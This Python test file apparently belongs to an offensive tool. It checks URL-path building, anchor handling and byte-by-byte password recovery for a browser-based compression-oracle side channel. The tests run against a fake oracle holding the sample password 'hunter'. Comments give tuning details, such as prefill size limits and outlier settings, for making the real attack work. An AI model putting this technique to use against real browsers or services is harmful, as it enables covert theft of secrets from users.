"""Sanity checks for the browser_pna path-builder, anchor derivation, and the
seeded / length-bounded recovery bookkeeping.

Run: python -m attacker.attack.tests.test_pna_path_builder

Pure-logic and host-runnable: browser_pna imports aiohttp only under
TYPE_CHECKING, and crack_byte_position (unlike run_attack) needs no aiohttp, so
the seed/length-bound recovery is driven here against a fake oracle.
"""
import asyncio

from attacker.attack.adapters.browser_pna import (
    BrowserPnaAdapter,
    _PATH_VERBATIM_BYTES,
    _URL_SAFE_FILLER_POOL,
    _assert_url_path_safe,
    _build_guess_path,
    _make_url_safe_filler,
    _url_safe_anchor,
)
from attacker.attack.config import AlignmentMode
from attacker.attack.engine import _trimmed_prefix, crack_byte_position


# --------------------------------------------------------------------------
# Path-builder
# --------------------------------------------------------------------------

def test_build_guess_path_assembles_in_order():
    path = _build_guess_path(
        prefill=b"IJKL", anchor=b"hu", candidate=b"n", alignment=b"ABC",
    )
    assert path == b"IJKLhunABC"


def test_build_guess_path_rejects_cr():
    # The CR/LF wall: a carriage return can never ride in a URL path.
    try:
        _build_guess_path(prefill=b"", anchor=b"h\r", candidate=b"u", alignment=b"")
    except ValueError:
        return
    raise AssertionError("expected ValueError for CR in path")


def test_build_guess_path_rejects_lf():
    try:
        _build_guess_path(prefill=b"", anchor=b"h", candidate=b"\n", alignment=b"")
    except ValueError:
        return
    raise AssertionError("expected ValueError for LF in path")


def test_assert_url_path_safe_rejects_space_percent_and_high_bytes():
    for bad in (b"a b", b"a%b", b"a\x80b", b"a#b", b"a/b", b"a?b", b"a\x00b"):
        try:
            _assert_url_path_safe(bad)
        except ValueError:
            continue
        raise AssertionError(f"expected ValueError for {bad!r}")


def test_assert_url_path_safe_accepts_pool_bytes():
    # Anything the adapter actually emits (uppercase filler/alignment, lowercase
    # + digit anchor/candidate) must pass.
    ok = bytes(_URL_SAFE_FILLER_POOL) + b"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGH"
    _assert_url_path_safe(ok)  # must not raise


def test_percent_is_not_path_verbatim():
    # '%' is excluded on purpose: it can absorb the next two bytes into a %XX
    # escape, making the on-wire length context-dependent.
    assert ord("%") not in _PATH_VERBATIM_BYTES


# --------------------------------------------------------------------------
# Anchor derivation
# --------------------------------------------------------------------------

def test_url_safe_anchor_identity_for_url_safe_prefix():
    assert _url_safe_anchor(b"hu") == b"hu"
    assert _url_safe_anchor(b"a9") == b"a9"


def test_url_safe_anchor_rejects_non_url_safe_prefix():
    # A misconfigured non-URL-safe alphabet must fail loudly, not silently
    # corrupt the wire bytes.
    try:
        _url_safe_anchor(b"h\r")
    except ValueError:
        return
    raise AssertionError("expected ValueError for non-URL-safe anchor")


def test_make_url_safe_filler_is_url_safe_and_sized():
    filler = _make_url_safe_filler(64)
    assert len(filler) == 64
    assert set(filler) <= set(_URL_SAFE_FILLER_POOL)
    _assert_url_path_safe(filler)  # must not raise
    assert _make_url_safe_filler(0) == b""


# --------------------------------------------------------------------------
# default_config invariants (the length-bounded / seeded design)
# --------------------------------------------------------------------------

def test_default_config_is_length_bounded_and_url_safe():
    cfg = BrowserPnaAdapter.default_config()
    # No injectable terminator: recovery is length-bounded via max_length.
    assert cfg.terminator == b""
    assert not cfg.terminator  # falsy => run_attack won't append/match it
    assert cfg.flush_pool == "url_safe_disjoint"
    assert cfg.alignment_pool == bytes(b"ABCDEFGH")
    assert cfg.alignment_mode == AlignmentMode.FULL_SWEEP
    assert list(cfg.alignment_lengths) == list(range(8))
    assert cfg.constant_prefix_trim is True
    # Regression guard: the 2-byte anchor's 3-byte LZ77 match only compresses at
    # a SHORT distance, so the prefill must stay small (the signal is empirically
    # clean around 512..2048 and gone by ~8 KiB). Copying the Firefox 16384 here
    # silently kills recovery -- keep this well below that.
    assert cfg.guess_prefill_bytes <= 4096
    # The random compressible prefill makes any nonzero outlier threshold discard
    # every round; averaging handles the noise instead.
    assert cfg.outlier_threshold == 0


# --------------------------------------------------------------------------
# Anchor bookkeeping: the 2-byte anchor is always the two password bytes that
# precede the target, so anchor|candidate is the >=3-byte LZ77 match run.
# --------------------------------------------------------------------------

def test_two_byte_anchor_tracks_consecutive_password_bytes():
    cfg = BrowserPnaAdapter.default_config()  # constant_prefix_trim=True
    seed = b"hu"  # seeded pw0 pw1
    # Recovering the tail of "hunter": pairs hu->n, un->t, nt->e, te->r
    assert _trimmed_prefix(seed, b"", cfg) == b"hu"
    assert _trimmed_prefix(seed, b"n", cfg) == b"un"
    assert _trimmed_prefix(seed, b"nt", cfg) == b"nt"
    assert _trimmed_prefix(seed, b"nte", cfg) == b"te"
    assert _trimmed_prefix(seed, b"nter", cfg) == b"er"


# --------------------------------------------------------------------------
# Seed / length-bound recovery: given a seeded 2-byte prefix and a known
# length, the engine recovers exactly the tail (no terminator).
# --------------------------------------------------------------------------

class _FakeOracle:
    """Simulates the compression oracle for a known password. The correct next
    byte after a 2-byte anchor leaks (fewer wire bytes) only at one alignment
    length, exactly like a real LZ77 tipping point."""

    def __init__(self, password: bytes, tip_al: int = 3, base: int = 200,
                 delta: int = 40) -> None:
        self.signals = {
            password[i:i + 2]: password[i + 2:i + 3]
            for i in range(len(password) - 2)
        }
        self.tip_al = tip_al
        self.base = base
        self.delta = delta

    async def measure_once(self, prefix, candidate, alignment) -> int:
        correct = self.signals.get(prefix)
        if candidate == correct and len(alignment) == self.tip_al:
            return self.base - self.delta
        return self.base


async def _recover_tail(oracle, cfg) -> bytes:
    """A minimal mirror of run_attack's position loop: length-bounded by
    max_length, no terminator. Threads the anchor through _trimmed_prefix
    exactly as the engine does."""
    recovered = b""
    for pos in range(cfg.max_length):
        prefix = _trimmed_prefix(cfg.known_prefix, recovered, cfg)
        best, _info = await crack_byte_position(
            adapter=oracle, config=cfg, prefix=prefix,
            initial_alignment=list(cfg.alignment_lengths),
            log_prefix=f"pos {pos}",
        )
        recovered += best
    return recovered


def test_seeded_length_bounded_recovers_exact_tail():
    password = b"hunter"          # pw0..pw5
    seed = password[:2]           # seeded pw0 pw1 = "hu"
    tail = password[2:]           # to recover = "nter"
    cfg = BrowserPnaAdapter.default_config().overlay({
        "known_prefix": seed.decode(),
        "alphabet": "nterabcd",   # includes the tail bytes + distractors
        "max_length": len(tail),  # seeded length bounds the loop
        "min_margin": 16,
        "outlier_threshold": 0,
    })
    oracle = _FakeOracle(password)
    recovered = asyncio.run(_recover_tail(oracle, cfg))
    # Recovers exactly the tail, length-bounded (no terminator).
    assert recovered == tail
    assert len(recovered) == len(tail)
    # Full secret reconstructs as seed(2) + recovered tail.
    assert seed + recovered == password


def test_crack_single_position_uses_two_byte_anchor():
    cfg = BrowserPnaAdapter.default_config().overlay({
        "known_prefix": "hu",
        "alphabet": "abnt",
        "min_margin": 16,
        "outlier_threshold": 0,
    })
    oracle = _FakeOracle(b"hunter")

    seen_prefixes = []
    orig = oracle.measure_once

    async def _spy(prefix, candidate, alignment):
        seen_prefixes.append(prefix)
        return await orig(prefix, candidate, alignment)

    oracle.measure_once = _spy
    best, info = asyncio.run(crack_byte_position(
        adapter=oracle, config=cfg, prefix=b"hu",
        initial_alignment=list(range(8)), log_prefix="test",
    ))
    assert best == b"n"
    assert info["clean_commit"] is True
    # Every measurement saw the 2-byte anchor, nothing else.
    assert set(seen_prefixes) == {b"hu"}


if __name__ == "__main__":
    test_build_guess_path_assembles_in_order()
    test_build_guess_path_rejects_cr()
    test_build_guess_path_rejects_lf()
    test_assert_url_path_safe_rejects_space_percent_and_high_bytes()
    test_assert_url_path_safe_accepts_pool_bytes()
    test_percent_is_not_path_verbatim()
    test_url_safe_anchor_identity_for_url_safe_prefix()
    test_url_safe_anchor_rejects_non_url_safe_prefix()
    test_make_url_safe_filler_is_url_safe_and_sized()
    test_default_config_is_length_bounded_and_url_safe()
    test_two_byte_anchor_tracks_consecutive_password_bytes()
    test_seeded_length_bounded_recovers_exact_tail()
    test_crack_single_position_uses_two_byte_anchor()
    print("pna path-builder tests: ok")
